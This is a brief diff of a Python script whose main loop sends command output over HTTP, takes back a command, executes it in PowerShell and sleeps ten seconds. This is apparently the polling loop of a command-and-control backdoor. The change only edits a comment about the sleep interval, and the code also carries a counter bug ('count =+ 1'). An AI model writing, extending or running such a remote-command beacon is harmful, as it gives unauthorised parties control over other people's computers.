@@ -45,7 +45,7 @@ if __name__ == "__main__":
         command_to_run = http_sender(output)
         if command_to_run:
             output = run_powershell_command(command_to_run) 
-        # Sleep for 2 minutes (120 seconds) before sending the next request   
+        # Sleep for a specified ammount of time (10 seconds) before sending the next request   
         time.sleep(10)  
         count =+ 1
         
